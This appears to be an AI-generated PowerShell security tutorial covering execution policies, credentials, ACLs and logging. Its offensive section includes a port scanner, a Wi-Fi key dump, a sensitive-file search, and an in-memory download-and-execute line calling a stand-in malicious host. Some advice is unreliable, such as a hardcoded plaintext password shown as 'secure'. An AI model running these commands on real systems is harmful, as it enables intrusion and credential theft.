# **ğŸš€ PowerShell Security & Compliance - A Complete Guide**

PowerShell is a **powerful tool** for managing systems, but with great power comes great responsibility! **Security & compliance** are essential to prevent unauthorized access, data leaks, and security breaches.

---

## **ğŸ“Œ 1. Execution Policies & Secure Script Execution**

### **ğŸ”¹ What is an Execution Policy?**

PowerShell **execution policies** control whether **scripts are allowed to run** and prevent unauthorized scripts from executing malicious code.

### **ğŸ”¹ Check Current Execution Policy**

```powershell
Get-ExecutionPolicy
```

âœ… Displays **the current security level**.

### **ğŸ”¹ Types of Execution Policies**

| **Policy**       | **Description**                                                      |
| ---------------- | -------------------------------------------------------------------- |
| **Restricted**   | **Default** - No scripts are allowed to run.                         |
| **AllSigned**    | Only scripts **signed by a trusted publisher** can run.              |
| **RemoteSigned** | Local scripts can run, but downloaded scripts need to be **signed**. |
| **Unrestricted** | Scripts run without restriction (âš ï¸ Not recommended!).               |
| **Bypass**       | No security applied (used for special automation cases).             |

### **ğŸ”¹ Changing Execution Policy (Set-ExecutionPolicy)**

```powershell
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

âœ… Allows **safe execution** of scripts **without disabling security**.

### **ğŸ”¹ Temporarily Bypass Execution Policy**

If you need to run a script without changing the policy:

```powershell
powershell -ExecutionPolicy Bypass -File "C:\Scripts\MyScript.ps1"
```

âœ… Runs the script **without modifying system settings**.

---

## **ğŸ“Œ 2. Handling Credentials Securely (Get-Credential)**

**Never hardcode passwords** in PowerShell scripts! Use **secure credential management**.

### **ğŸ”¹ Securely Prompt for a Username & Password**

```powershell
$cred = Get-Credential
```

âœ… Prompts **securely** for username & password.

### **ğŸ”¹ Store Credentials Securely**

```powershell
$securePassword = ConvertTo-SecureString "P@ssword123" -AsPlainText -Force
$cred = New-Object PSCredential ("AdminUser", $securePassword)
```

âœ… Stores credentials **in a secure object**.

### **ğŸ”¹ Save & Load Credentials Securely**

```powershell
# Save credentials to a file (encrypted)
$cred | Export-Clixml -Path "C:\Secure\creds.xml"

# Load credentials from a file
$cred = Import-Clixml -Path "C:\Secure\creds.xml"
```

âœ… Credentials are **encrypted per user** and **cannot be read by others**.

---

## **ğŸ“Œ 3. Managing Access Control & Permissions**

### **ğŸ”¹ View File or Folder Permissions**

```powershell
Get-Acl -Path "C:\SensitiveData"
```

âœ… Shows **who has access** to the folder.

### **ğŸ”¹ Grant Full Control to a User**

```powershell
$acl = Get-Acl -Path "C:\SensitiveData"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("JohnDoe", "FullControl", "Allow")
$acl.SetAccessRule($rule)
Set-Acl -Path "C:\SensitiveData" -AclObject $acl
```

âœ… Gives **JohnDoe full access** to `C:\SensitiveData`.

### **ğŸ”¹ Remove User Permissions**

```powershell
$acl = Get-Acl -Path "C:\SensitiveData"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("JohnDoe", "FullControl", "Allow")
$acl.RemoveAccessRule($rule)
Set-Acl -Path "C:\SensitiveData" -AclObject $acl
```

âœ… **Revokes JohnDoeâ€™s access** to the folder.

### **ğŸ”¹ Prevent Access to a Folder**

```powershell
icacls "C:\SensitiveData" /deny Everyone:(F)
```

âœ… Completely **locks down** the folder from all users.

---

## **ğŸ“Œ 4. PowerShell Auditing & Logging**

### **ğŸ”¹ Enable PowerShell Logging**

To **audit all PowerShell commands**, enable logging.

#### **Enable Module Logging**

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name EnableModuleLogging -Value 1
```

âœ… Enables **logging for all PowerShell modules**.

#### **Enable Script Block Logging**

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1
```

âœ… Logs **all PowerShell commands** executed.

#### **View PowerShell Logs**

```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational"
```

âœ… Shows **PowerShell command history**.

---

## **ğŸ“Œ 5. Penetration Testing with PowerShell (Offensive Security)**

âš ï¸ **For Ethical Hacking & Security Research Only**

PowerShell is widely used in **penetration testing** (ethical hacking) for **network scanning, privilege escalation, and persistence**.

### **ğŸ”¹ Scan Open Ports on a Remote Machine**

```powershell
$ip = "192.168.1.100"
$ports = 20..1000
$openPorts = $ports | ForEach-Object {
    $test = Test-NetConnection -ComputerName $ip -Port $_ -InformationLevel Quiet
    if ($test) { $_ }
}
Write-Output "Open ports on $ip: $openPorts"
```

âœ… Scans **open ports** on a remote system.

---

### **ğŸ”¹ Check Active Network Connections**

```powershell
Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State
```

âœ… Lists **active TCP connections**.

---

### **ğŸ”¹ Extract Stored Wi-Fi Passwords**

```powershell
(netsh wlan show profile) | Select-String "All User Profile" | ForEach-Object {
    $profile = ($_ -split ":")[1].Trim()
    (netsh wlan show profile name="$profile" key=clear) | Select-String "Key Content"
}
```

âœ… Retrieves **saved Wi-Fi passwords** (requires admin rights).

---

### **ğŸ”¹ Detect Security Vulnerabilities in Windows**

```powershell
Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
```

âœ… Checks **installed antivirus software**.

---

### **ğŸ”¹ Search for Sensitive Files**

```powershell
Get-ChildItem -Path "C:\Users" -Recurse -Include *password*, *key*, *credential*
```

âœ… Searches for **sensitive files** on the system.

---

### **ğŸ”¹ Evading Antivirus Detection**

Some **malware authors** use PowerShell to **bypass security** by running scripts **in memory**.

âš ï¸ **DO NOT use this for malicious purposes!**

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://malicious.com/script.ps1")
```

âœ… Executes **a remote PowerShell script without saving it to disk**.

ğŸš¨ **How to Prevent This?**
1ï¸âƒ£ **Block PowerShell for non-admin users**  
2ï¸âƒ£ **Enable PowerShell logging**  
3ï¸âƒ£ **Use `Constrained Language Mode`** to prevent execution of malicious scripts

```powershell
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
```

âœ… **Prevents unauthorized scripts** from running.

---

## **ğŸ“Œ 6. Best Practices for PowerShell Security & Compliance**

âœ… **Use `RemoteSigned` Execution Policy** â†’ Prevent unsigned scripts from running.  
âœ… **Avoid Running Scripts from Untrusted Sources** â†’ Always review code before execution.  
âœ… **Enable Logging & Auditing** â†’ Track all PowerShell activity.  
âœ… **Manage User Permissions with ACLs** â†’ Restrict access to critical files.  
âœ… **Use `Constrained Language Mode`** â†’ Limit PowerShell capabilities for non-admin users.  
âœ… **Disable PowerShell for Non-Admins** â†’ Prevent unauthorized access.

---

## **ğŸ¯ Conclusion: Mastering PowerShell Security & Compliance**

âœ… PowerShell security **prevents unauthorized script execution**  
âœ… Use **secure credentials** and **avoid hardcoding passwords**  
âœ… **Manage file permissions & access control** with `Set-Acl`  
âœ… **Enable logging & auditing** to track PowerShell usage  
âœ… **PowerShell can be used for both security & hacking** â€“ use it responsibly!

Would you like **pre-built security scripts for automation?** Let me know! ğŸ˜ŠğŸš€
